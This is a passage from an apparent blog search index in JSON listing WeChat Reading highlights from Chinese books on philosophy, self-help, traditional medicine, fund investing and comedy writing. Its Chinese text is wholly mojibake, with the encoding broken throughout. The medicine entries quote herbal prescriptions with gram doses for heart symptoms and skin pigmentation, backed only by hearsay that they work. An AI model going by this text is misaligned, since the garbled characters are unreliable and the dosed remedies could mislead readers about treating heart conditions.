å…¶å®å°±æ˜¯æƒ³è¯´ï¼šä¸è¦ç­‰åˆ°æ˜å¤©ï¼Œæ‰å¼€å§‹åšä¸€ä¸ªå¹¸ç¦çš„äººã€‚","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"å“²å­¦å®—æ•™","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å“²å­¦å®—æ•™","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E5%93%B2%E5%AD%A6%E5%AE%97%E6%95%99/"}]},{"title":"åŠå°æ—¶æ¼«ç”»ä¸­å›½å“²å­¦å²","date":"2024-08-31T01:35:29.212Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å“²å­¦å®—æ•™/åŠå°æ—¶æ¼«ç”»ä¸­å›½å“²å­¦å²-é™ˆç£ŠÂ·åŠå°æ—¶æ¼«ç”»å›¢é˜Ÿ/","text":"ä½œè€…ï¼šé™ˆç£ŠÂ·åŠå°æ—¶æ¼«ç”»å›¢é˜Ÿ - å†…å®¹ç®€ä»‹ ã€ŠåŠå°æ—¶æ¼«ç”»ä¸­å›½å“²å­¦å²ã€‹ å…¶å®æ˜¯ä¸€æœ¬ä¸¥è°¨çš„æç®€ä¸­å›½å“²å­¦å²ï¼æ˜æ˜åœ¨çœ‹è¯¸å­ç™¾å®¶çš„ç²¾å½©ææ¶ï¼Œçœ‹å®Œå´ç§’æ‡‚äº†ä¸­å›½å“²å­¦çš„å¥¥å¦™ç²¾åï¼å­”å­çš„â€œç¤¼â€å…¶å®å°±æ˜¯ç”Ÿæ´»æŒ‡å—ï¼Œè¿æ¯ä¸ªäººè¯¥å¬å•¥æ­Œéƒ½å®‰æ’å¾—æ˜æ˜ç™½ç™½ï¼è€å­çš„ã€Šé“å¾·ç»ã€‹å…¶å®å°±æ˜¯ä¸€ä»½å†™ç»™ç»Ÿæ²»è€…çœ‹çš„è¿°èŒæŠ¥å‘Šï¼å¢¨å­ç«Ÿç„¶æ˜¯ä¸ªå˜»å“ˆä¾ ï¼Œä»–çš„æ ¸å¿ƒæ€æƒ³â€œéæ”»ï¼Œå…¼çˆ±â€ç”¨ä¸€å¥è¯æ¥æ¦‚æ‹¬å°±æ˜¯peace and loveï¼ä»åŸå§‹ç¤¾ä¼šåˆ°ç™¾å®¶äº‰é¸£ï¼Œè½»æ¾ææ‡‚å„’å®¶ã€é“å®¶ã€å¢¨å®¶çš„è¯ç”Ÿå’Œå‘å±•ï¼Œè®©ä½ åœ¨å“ˆå“ˆå¤§ç¬‘ä¸­ï¼Œä¸çŸ¥ä¸è§‰å°±ç†æ¸…äº†ä¸­å›½å“²å­¦çš„å®Œæ•´è„‰ç»œï¼ç¿»å¼€æœ¬ä¹¦ï¼Œåˆ†æ¸…ä¸­å›½å“²å­¦çš„ä¸‰å¤§æµæ´¾ï¼Œç†æ¸…ä¸­å›½å“²å­¦çš„æ¥é¾™å»è„‰ï¼ åŠå°æ—¶æ¼«ç”»ä¸­å›½å“²å­¦å² + ã€ŠåŠå°æ—¶æ¼«ç”»ä¸­å›½å“²å­¦å²ã€‹ å±æ€§ å†…å®¹ ISBN 9787559449863 ä½œè€… é™ˆç£ŠÂ·åŠå°æ—¶æ¼«ç”»å›¢é˜Ÿ å‡ºç‰ˆå¹´ 2020-08-01 å‡ºç‰ˆç¤¾ æ±Ÿè‹å‡¤å‡°æ–‡è‰ºå‡ºç‰ˆç¤¾ æ¥æº åŠå°æ—¶æ¼«ç”»ä¸­å›½å“²å­¦å² åˆ†ç±» å“²å­¦å®—æ•™-ä¸œæ–¹å“²å­¦ é«˜äº®åˆ’çº¿ äº” ä¸­å›½å¤å…¸å“²å­¦çš„æ ¸å¿ƒâ€”â€”é˜´é˜³äº”è¡Œ äº” ä¸­å›½å¤å…¸å“²å­¦çš„æ ¸å¿ƒâ€”â€”é˜´é˜³äº”è¡Œ å¥åº·è®ºé˜´é˜³ï¼Œå–åçœ‹äº”è¡Œï¼Œ å‡ºé—¨ç¿»çš‡å†ï¼Œç»“å©šçœ‹å…«å­—ã€‚ â€” åˆ›å»ºäº [[2021-05-29]] 22:18 ^23-1400-1479 ä¸‰ å„’å®¶å“²å­¦çš„åˆ›å§‹äººâ€”â€”å­”å­(ä¸Š) è™½è¯´å½“æ—¶æ•´ä¸ªç¤¾ä¼šç¤¼å´©ä¹åï¼Œä½†é²å›½æ¯•ç«Ÿæ˜¯å‘¨å…¬çš„è€å®¶ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜ä¿ç•™äº†å¾ˆå¤šç¤¼ä¹æ–‡åŒ–ã€‚ å—åˆ°é²å›½å¤§ç¯å¢ƒçš„ç†é™¶ï¼Œå­”å­æ‰“å°å¯¹å‘¨ç¤¼å¾ˆæ„Ÿå…´è¶£ï¼Œåˆ«äººéƒ½çœ‹é€‰ç§€ç»¼è‰ºï¼Œä»–å´çˆ±ç ”ç©¶å©šåº†è‘¬ç¤¼ã€‚ [æ’å›¾] å­”å­3å²æ²¡äº†çˆ¹ï¼Œ17å²æ²¡äº†å¦ˆï¼Œç”Ÿæ´»è´¨é‡å ªå¿§ï¼Œåªèƒ½å»åšåº•å±‚æ‰“å·¥ä»”ã€‚ â€” åˆ›å»ºäº [[2021-05-29]] 22:09 ^291189470-7qFsb9dpg 45åº¦ä»°æœ›å¤©ç©ºæ›´æ‚²ä¼¤","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"å“²å­¦å®—æ•™","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å“²å­¦å®—æ•™","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E5%93%B2%E5%AD%A6%E5%AE%97%E6%95%99/"}]},{"title":"äººé—´è¡Œèµ°ï¼šå‘ç€é€šé€ä¸è‡ªç”±","date":"2024-08-31T01:35:29.210Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å“²å­¦å®—æ•™/äººé—´è¡Œèµ°ï¼šå‘ç€é€šé€ä¸è‡ªç”±-éƒ­åŸ/","text":"ä½œè€…ï¼šéƒ­åŸ - å†…å®¹ç®€ä»‹ ã€Šäººé—´è¡Œèµ°ï¼šå‘ç€é€šé€ä¸è‡ªç”±ã€‹ è¿™æ˜¯ä¸€æœ¬åˆ†äº«äººç”Ÿæ­£ç¡®ç”Ÿæ´»æ€åº¦çš„å¿ƒç†åŠ±å¿—ä¹¦ã€‚ä½œè€…å°†äººç”Ÿå–»ä½œä¸€åœºæ—…è¡Œï¼Œè€Œæˆ‘ä»¬éƒ½æ˜¯äººä¸–é—´çš„è¡Œäººã€‚åœ¨è¿™è¶Ÿæ—…è¡Œä¸­ï¼Œæ¯ä¸ªäººéƒ½ä¸å…ä¼šé‡åˆ°ç„¦è™‘ã€æŒ£æ‰ã€å½·å¾¨â€¦â€¦ä½†æ˜¯è¿™äº›å…‰æ€ªé™†ç¦»çš„ä¸–ç›¸èƒŒåï¼Œä»æœ‰äº›ä¸å˜ä¸œè¥¿éœ€è¦æˆ‘ä»¬å»äº†è§£ï¼Œè€Œè‘—ä½œå°±æ˜¯é€šè¿‡è‡ªå·±å¯Œæœ‰å“²æ€å…¼å…·æœ‰è¶£çš„å†…å®¹ï¼Œå¸¦æˆ‘ä»¬æ­£ç¡®çœ‹å¾…ç”Ÿæ´»å¸¸é‡åˆ°çš„é—®é¢˜ï¼Œæ¯”å¦‚åè§ã€ä¸ä»–äººçš„äº¤å¾€ã€å­¤ç‹¬ã€çˆ±æƒ…ã€å©šå§»ï¼Œç­‰ç­‰ã€‚è‘—ä½œç»“æ„åˆ«å…·ä¸€æ ¼ï¼Œé‡‡å–â€œè™šå®ç»“åˆâ€çš„æ‰‹æ³•ï¼Œå°†ä¸»é¢˜å¯“äºç°å®æ—…è¡ŒåŠæ€æƒ³æ—…è¡Œä¹‹ä¸­ï¼Œå°†å›°æ‰°æˆ‘ä»¬ç”Ÿæ´»çš„è¯é¢˜å¨“å¨“é“æ¥ï¼Œä»¥è‡ªå·±ä¸€è´¯çš„è¾›è¾£æ–‡é£ï¼Œåˆ†äº«å…·æœ‰å“²ç†æ€§çš„è®¤çŸ¥ã€‚è®©æˆ‘ä»¬èƒ½å¤Ÿæ›´åŠ é€šé€åœ°çœ‹å¾…ä¸–äº‹ï¼Œç»™æ€æƒ³è§£ç»‘ï¼Œè·å¾—è‡ªç”±ã€‚ äººé—´è¡Œèµ°ï¼šå‘ç€é€šé€ä¸è‡ªç”± + ã€Šäººé—´è¡Œèµ°ï¼šå‘ç€é€šé€ä¸è‡ªç”±ã€‹ å±æ€§ å†…å®¹ ISBN 9787521730005 ä½œè€… éƒ­åŸ å‡ºç‰ˆå¹´ 2021-06-01 å‡ºç‰ˆç¤¾ ä¸­ä¿¡å‡ºç‰ˆé›†å›¢ æ¥æº äººé—´è¡Œèµ°ï¼šå‘ç€é€šé€ä¸è‡ªç”± åˆ†ç±» å“²å­¦å®—æ•™-ä¼¦ç†å­¦ é«˜äº®åˆ’çº¿","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"å“²å­¦å®—æ•™","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å“²å­¦å®—æ•™","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E5%93%B2%E5%AD%A6%E5%AE%97%E6%95%99/"}]},{"title":"åŒ»å­¦å°±ä¼š","date":"2024-08-31T01:35:29.208Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/åŒ»å­¦å¥åº·/åŒ»å­¦å°±ä¼š-æ‡’å…”å­/","text":"ä½œè€…ï¼šæ‡’å…”å­ - å†…å®¹ç®€ä»‹ ã€ŠåŒ»å­¦å°±ä¼šã€‹ æœ¬ä¹¦ä»ä¸­åŒ»åŸºç¡€çŸ¥è¯†å…¥æ‰‹ï¼Œå¸®åŠ©ä½ æŠŠä¸­åŒ»çŸ¥è¯†çš„æ˜Ÿæ˜Ÿç‚¹ç‚¹ï¼Œæ…¢æ…¢çš„è¿åœ¨ä¸€èµ·ï¼Œå…ˆè¿æˆçº¿ï¼Œå†è¿æˆé¢ã€‚ç­‰æ•´åˆæˆäº†ä¸€ä¸ªç³»ç»Ÿåœ¨ä½ å¿ƒé‡Œæ—¶ï¼Œä¸éœ€è¦å­¦ä¹ æ‰€æœ‰ç—…çš„æ²»ç–—æ–¹æ³•ï¼Œåªéœ€è¦æ ¹æ®ç—‡çŠ¶å½’ç±»å°±èƒ½æŸ¥å‡†ç—…å› ã€‚ä¹¦ä¸­æ¯ä¸€ç§ä½“è´¨éƒ½å¯¹åº”äº†æ–¹å‰‚ï¼Œå°±åƒæ˜¯æªé‡Œçš„å­å¼¹ï¼Œè¦æƒ³å‘å°„å¾—ç²¾å‡†ï¼Œå¾—å…ˆæœ‰æªï¼Œå­å¼¹å°±åœ¨é‚£é‡Œï¼Œæˆåƒä¸Šä¸‡å‘ï¼Œå†ä»£ååŒ»éƒ½ç»™æˆ‘ä»¬å‡†å¤‡å¥½äº†ï¼Œå°±ç­‰ç€æˆ‘ä»¬æŠŠæªé€ å¥½ï¼Œç„¶åä¸Šè†›ã€‚ è¿™æœ¬ä¹¦åˆ†ä¸ºå…«ç« ï¼Œå…±42ç¯‡æ–‡ç« ï¼Œæ·±å…¥æµ…å‡ºåœ°ç”¨ä¸­åŒ»ä»‹ç»äººä½“ä¸­æœ€é‡è¦çš„äº”è„å…­è…‘ä»¥åŠ9ç§ä½“è´¨ã€‚ åŒ»å­¦å°±ä¼š + ã€ŠåŒ»å­¦å°±ä¼šã€‹ å±æ€§ å†…å®¹ ISBN 9787518940493 ä½œè€… æ‡’å…”å­ å‡ºç‰ˆå¹´ 2018-04-01 å‡ºç‰ˆç¤¾ ç§‘å­¦æŠ€æœ¯æ–‡çŒ®å‡ºç‰ˆç¤¾ æ¥æº åŒ»å­¦å°±ä¼š åˆ†ç±» åŒ»å­¦å¥åº·-å¥åº· é«˜äº®åˆ’çº¿ ç¬¬äºŒç«  å¿ƒ ç¬¬äºŒç«  å¿ƒ å¦‚æœå¿ƒæ°”ä¸è¶³ï¼Œè¡€æ¶²äºè™šï¼Œè¡€è„‰å£…å¡ï¼Œåˆ™ä¼šè¡€è¿å¤±å¸¸ï¼Œè„è…‘å¤±å…»ï¼Œå¸¸è§å¿ƒæ‚¸æ€”å¿¡ã€å¿ƒèƒ¸æ†‹é—·ç–¼ç—›ã€å”‡èˆŒé’ç´«ã€è„‰ç»†æ¶©æˆ–è€…è„‰ç»“ä»£ã€‚ â€” åˆ›å»ºäº [[2022-03-09]] 22:06 ^37-2203-2260 ç¬¬äºŒç«  å¿ƒ ä½™æµ©å…ˆç”Ÿå†™è¿‡ä¸€æœ¬ã€Šä¸‡ç—…ä»æ ¹æ²»ã€‹ï¼Œé‡Œé¢æœ‰ä¸€ç¯‡å°±ä¸“é—¨å†™ä»–ç”¨â€œå¿ƒä¸»è¡€è„‰ï¼Œå…¶ååœ¨é¢â€çš„æ€è·¯ï¼Œä»è°ƒæ²»è¡€æ¶²å…¥æ‰‹æ¥æ²»ç–—é»„è¤æ–‘çš„æ–¹æ³•ã€‚è¯æ–¹å¦‚ä¸‹ï¼Œä»…ä¾›å‚è€ƒï¼šé»„èŠª30å…‹ã€å½“å½’15å…‹ã€ä¸¹å‚20å…‹ã€æ¡‚æ15å…‹ã€ç†Ÿåœ°20å…‹ã€ç™½èŠ20å…‹ã€å·èŠ10å…‹ã€ç«ç‘°èŠ±30å…‹ã€ç”Ÿç”˜è‰8å…‹ã€‚è¿™ä¸ªæ€è·¯å°±æ˜¯â€œç›Šæ°”å…»è¡€ï¼Œæ´»è¡€é€šè„‰â€ï¼Œå¿ƒè¡€å¥½äº†ï¼Œè„¸è‰²è‡ªç„¶å°±å¥½äº†ï¼Œæ®è¯´æ•ˆæœä¸é”™ã€‚ â€” åˆ›å»ºäº [[2022-03-09]] 22:19 ^37-6489-6729 äºŒ å¿ƒè„æ—©æå¯èƒ½æ˜¯è„¾èƒƒçš„å°è½®ä¸è½¬äº† äºŒ å¿ƒè„æ—©æå¯èƒ½æ˜¯è„¾èƒƒçš„å°è½®ä¸è½¬äº† ç‚™ç”˜è‰æ±¤ï¼šç‚™ç”˜è‰12å…‹ã€ç”Ÿå§œ9å…‹ã€æ¡‚æ6å…‹ã€äººå‚6å…‹ã€ç”Ÿåœ°é»„30å…‹ã€é˜¿èƒ¶9å…‹ã€éº¦é—¨å†¬9å…‹ã€ç«éº»ä»9å…‹ã€å¤§æ£7æšï¼ˆæ°å¼€ï¼‰ã€‚ä»¥æ°´1500æ¯«å‡ï¼ŒåŠ å…¥é»„é…’æˆ–è€…æ¸…é…’50æ¯«å‡ï¼Œç…®æ²¸åå°ç«å†ç…®50åˆ†é’Ÿã€‚å°†é˜¿èƒ¶çƒŠåŒ–å…‘å…¥è¯æ¶²ä¸­ï¼Œåˆ†2ï½3æ¬¡æ¸©æœï¼ˆå‰‚é‡ä»…ä¾›å‚è€ƒï¼Œè¯·åœ¨åŒ»ç”ŸæŒ‡å¯¼ä¸‹ç”¨è¯ï¼‰ã€‚ â€” åˆ›å»ºäº [[2022-03-09]] 22:54 ^38-3574-3712 ä¸‰ å¿ƒè…¹ç–¼ç—›ï¼Œå¯ä»¥ç”¨æ´»ç»œæ•ˆçµä¸¹è¯•è¯•çœ‹ ä¸‰ å¿ƒè…¹ç–¼ç—›ï¼Œå¯ä»¥ç”¨æ´»ç»œæ•ˆçµä¸¹è¯•è¯•çœ‹ æ´»ç»œæ•ˆçµä¸¹ â€” åˆ›å»ºäº [[2022-03-09]] 23:00 ^39-722-734","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"åŒ»å­¦å¥åº·","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/åŒ»å­¦å¥åº·","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E5%8C%BB%E5%AD%A6%E5%81%A5%E5%BA%B7/"}]},{"title":"é“¶è¡Œèºä¸é’‰","date":"2024-08-31T01:35:29.206Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å…¬ä¼—å·/é“¶è¡Œèºä¸é’‰-å…¬ä¼—å·/","text":"ä½œè€…ï¼šå…¬ä¼—å· - å†…å®¹ç®€ä»‹ ã€Šé“¶è¡Œèºä¸é’‰ã€‹ é“¶è¡Œèºä¸é’‰ï¼Œä¸“æ³¨äºåŸºé‡‘æŠ•èµ„ï¼Œç•…é”€ä¹¦ã€ŠæŒ‡æ•°åŸºé‡‘æŠ•èµ„æŒ‡å—ã€‹ã€Šä¸»åŠ¨åŸºé‡‘æŠ•èµ„æŒ‡å—ã€‹ä½œè€…ï¼Œå¤šæ¬¡æ’åè´¢ç»ä¹¦ç±æ¦œé¦–ã€‚ é¦–å±Šé‡‘ç‰›å¥–æŠ•é¡¾ä¸»ç†äººï¼Œç®¡ç†è¶…ç™¾äº¿æŠ•é¡¾ç»„åˆã€‚åŸã€Œå®šæŠ•åå¹´èµšåå€ã€ã€‚å¾®åšã€é›ªçƒè´¦å·ï¼šé“¶è¡Œèºä¸é’‰ã€‚ é“¶è¡Œèºä¸é’‰ + ã€Šé“¶è¡Œèºä¸é’‰ã€‹ å±æ€§ å†…å®¹ ISBN null ä½œè€… å…¬ä¼—å· å‡ºç‰ˆå¹´ å‡ºç‰ˆç¤¾ æ¥æº é“¶è¡Œèºä¸é’‰ åˆ†ç±» é«˜äº®åˆ’çº¿ ï¼»8æœˆ20æ—¥ï¼½æŒ‡æ•°ä¼°å€¼æ•°æ®(è€å¿ƒï¼Œæ˜¯æŠ•èµ„è€…æœ€å¥½çš„ç¾å¾·ï¼‰ ï¼»8æœˆ20æ—¥ï¼½æŒ‡æ•°ä¼°å€¼æ•°æ®(è€å¿ƒï¼Œæ˜¯æŠ•èµ„è€…æœ€å¥½çš„ç¾å¾·ï¼‰ ç†Šå¸‚ä¸ä¹°è‚¡ï¼Œç‰›å¸‚ç™½è¾›è‹¦ã€‚ ç‰›å¸‚é…ç‚¹å€ºï¼Œæ”¶ç›Šæ— å¤§ç¢ â€” åˆ›å»ºäº [[2021-08-21]] 16:48 ^-1179-1203","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"å…¬ä¼—å·","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å…¬ä¼—å·","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E5%85%AC%E4%BC%97%E5%8F%B7/"}]},{"title":"è™¾æ‘¸è±¡","date":"2024-08-31T01:35:29.204Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å…¬ä¼—å·/è™¾æ‘¸è±¡-å…¬ä¼—å·/","text":"ä½œè€…ï¼šå…¬ä¼—å· - å†…å®¹ç®€ä»‹ ã€Šè™¾æ‘¸è±¡ã€‹ çœ‹ç»å…¸çš„ä¹¦ï¼Œå†™éšå¿ƒçš„æ–‡ã€‚ è™¾æ‘¸è±¡ + ã€Šè™¾æ‘¸è±¡ã€‹ å±æ€§ å†…å®¹ ISBN null ä½œè€… å…¬ä¼—å· å‡ºç‰ˆå¹´ å‡ºç‰ˆç¤¾ æ¥æº è™¾æ‘¸è±¡ åˆ†ç±» é«˜äº®åˆ’çº¿ ã€Šåœ°ä¸‹å®¤æ‰‹è®°ã€‹ï¼šé€‰æ‹©å»‰ä»·çš„å¹¸ç¦ï¼Œè¿˜æ˜¯å´‡é«˜çš„è‹¦éš¾ ã€Šåœ°ä¸‹å®¤æ‰‹è®°ã€‹ï¼šé€‰æ‹©å»‰ä»·çš„å¹¸ç¦ï¼Œè¿˜æ˜¯å´‡é«˜çš„è‹¦éš¾ åˆ°åº•å“ªä¸€ä¸ªæ›´å¥½äº›â€”â€”æ˜¯å»‰ä»·çš„å¹¸ç¦ï¼Œè¿˜æ˜¯å´‡é«˜çš„è‹¦éš¾ï¼Ÿ â€” åˆ›å»ºäº [[2021-08-06]] 00:01 ^-191-216","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"å…¬ä¼—å·","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å…¬ä¼—å·","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E5%85%AC%E4%BC%97%E5%8F%B7/"}]},{"title":"æè¯è„±å£ç§€å·¥ä½œæ‰‹å†Œ","date":"2024-08-31T01:35:29.202Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ä¸ªäººæˆé•¿/æè¯è„±å£ç§€å·¥ä½œæ‰‹å†Œ-æè¯/","text":"ä½œè€…ï¼šæè¯ - å†…å®¹ç®€ä»‹ ã€Šæè¯è„±å£ç§€å·¥ä½œæ‰‹å†Œã€‹ æè¯åˆ†äº«åˆ›ä½œç»éªŒï¼åˆ›æ„æ˜¯æ™ºåŠ›æ´»å„¿ï¼Œä¹Ÿæ˜¯ä½“åŠ›æ´»å„¿ï¼Œå½’æ ¹ç»“åº•æ˜¯è‹¦åŠ›æ´»å„¿ï¼è¿™æ˜¯æè¯å†™ç»™æ‰€æœ‰åˆ›æ„å·¥ä½œè€…çš„ä¸€æœ¬å·¥ä½œæ‰‹å†Œã€‚åœ¨æœ¬ä¹¦ä¸­ï¼Œæè¯æ¯«æ— ä¿ç•™åœ°åˆ†äº«äº†ä»ä¸šä»¥æ¥æ‰€æœ‰çš„åˆ›ä½œå¿ƒå¾—ï¼Œæ—¢æœ‰å…·ä½“çš„åˆ›ä½œæ–¹æ³•ï¼Œå†™é€å­—ç¨¿ã€å¤©å¤©å†™ç¨¿ï¼Œä¹Ÿæœ‰å¯¹å¾…å·¥ä½œçš„æ€åº¦ï¼Œä½ çš„å…¨éƒ¨äººç”Ÿéƒ½ç†åº”è¦ä¸ºä½ çš„åˆ›ä½œæä¾›å…»åˆ†ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œä»–è¿˜æ‚‰å¿ƒè§£ç­”äº†åˆ›æ„å·¥ä½œè€…åœ¨åˆ›ä½œã€å·¥ä½œè¿‡ç¨‹ä¸­é‡åˆ°çš„å›°æƒ‘ä¸éš¾é¢˜ã€‚è¿™äº›æ–¹æ³•ã€ä¹ æƒ¯æˆå°±äº†æè¯ï¼Œè¿™æœ¬ä¹¦ä¹Ÿä¼šè®©ä½ æ”¶è·ä¿¡å¿µå’Œå®å®åœ¨åœ¨çš„æ–¹æ³•ã€‚ç¿»å¼€æœ¬ä¹¦ï¼Œåƒæè¯ä¸€æ ·ç†¬å‡ºåˆ›æ„ï¼Œç£¨å‡ºçµæ„Ÿï¼ æè¯è„±å£ç§€å·¥ä½œæ‰‹å†Œ + ã€Šæè¯è„±å£ç§€å·¥ä½œæ‰‹å†Œã€‹ å±æ€§ å†…å®¹ ISBN 9787559461186 ä½œè€… æè¯ å‡ºç‰ˆå¹´ 2021-08-01 å‡ºç‰ˆç¤¾ æ±Ÿè‹å‡¤å‡°æ–‡è‰ºå‡ºç‰ˆç¤¾ æ¥æº æè¯è„±å£ç§€å·¥ä½œæ‰‹å†Œ åˆ†ç±» ä¸ªäººæˆé•¿-æ²Ÿé€šè¡¨è¾¾ é«˜äº®åˆ’çº¿ 2 å…¶æ¬¡ï¼Œè¿™æ˜¯ä¸€ä»½å’Œç”Ÿæ´»åˆ†ä¸å¼€çš„å·¥ä½œ 2 å…¶æ¬¡ï¼Œè¿™æ˜¯ä¸€ä»½å’Œç”Ÿæ´»åˆ†ä¸å¼€çš„å·¥ä½œ ä»¥å¤§å¤šæ•°äººçš„æ‡’æƒ°ç¨‹åº¦ï¼ŒçœŸçš„è°ˆä¸åˆ°è¢«åˆ›ä½œæç©ºçš„åœ°æ­¥ã€‚ â€” åˆ›å»ºäº [[2021-10-06]] 23:50 ^29-2315-2340 2 å…¶æ¬¡ï¼Œè¿™æ˜¯ä¸€ä»½å’Œç”Ÿæ´»åˆ†ä¸å¼€çš„å·¥ä½œ åˆ«å› ä¸ºä»äº‹äº†ä¸€ä»½æ²¡äººé€¼ä½ åšçš„èŒä¸šï¼Œè€Œè«åå…¶å¦™åœ°éª„å‚²ï¼Œåˆåœ¨æ— äººç†ç¬æ—¶æ„Ÿåˆ°å§”å±ˆã€‚ â€” åˆ›å»ºäº [[2021-10-06]] 23:51 ^29-2403-2441 3 